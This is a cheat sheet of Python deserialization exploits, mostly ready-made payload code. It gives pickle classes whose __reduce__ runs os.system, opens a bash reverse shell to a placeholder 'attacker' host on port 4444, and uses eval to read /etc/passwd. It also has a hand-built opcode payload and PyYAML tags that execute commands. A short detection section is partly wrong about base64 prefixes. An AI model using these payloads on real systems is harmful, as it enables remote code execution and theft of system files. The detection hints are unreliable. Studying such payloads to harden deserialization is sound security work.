# Python Pickle Exploitation

## 1. Basic Pickle RCE
```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload.decode())
```

## 2. Reverse Shell Pickle
```python
import pickle, subprocess, base64

class Shell:
    def __reduce__(self):
        return (subprocess.call, (['bash','-c','bash -i >& /dev/tcp/attacker/4444 0>&1'],))

payload = base64.b64encode(pickle.dumps(Shell()))
print(payload.decode())
```

## 3. File Read Pickle
```python
import pickle, base64

class ReadFile:
    def __reduce__(self):
        return (eval, ("open('/etc/passwd').read()",))

payload = base64.b64encode(pickle.dumps(ReadFile()))
print(payload.decode())
```

## 4. Pickle opcodes
```python
# c = GLOBAL (import module)
# ( = MARK
# S = STRING
# . = STOP
# \x80 = PROTO
# \x85 = TUPLE1
# \x86 = TUPLE2
# R = REDUCE
```

## 5. Manual Pickle Payload
```python
import pickle
import pickletools

# Craft malicious pickle
payload = b'\x80\x04\x95\x1f\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
pickletools.dis(payload)
```

## 6. PyYAML Deserialization
```yaml
# PyYAML < 5.1
!!python/object/apply:os.system ['id']
!!python/object/new:subprocess.check_output [['id']]
!!python/object/apply:subprocess.check_output [['cat', '/etc/passwd']]
```

## 7. Marshal Module
```python
import marshal
# Similar to pickle but for code objects
```

## 8. Shelve Module
```python
# Uses pickle internally
import shelve
# shelve.open() uses pickle
```

## Detection
```bash
# Look for base64 starting with gAN (pickle protocol 2)
# Look for base64 starting with gB (pickle protocol 1)
# Look for Content-Type: application/python-pickle
```
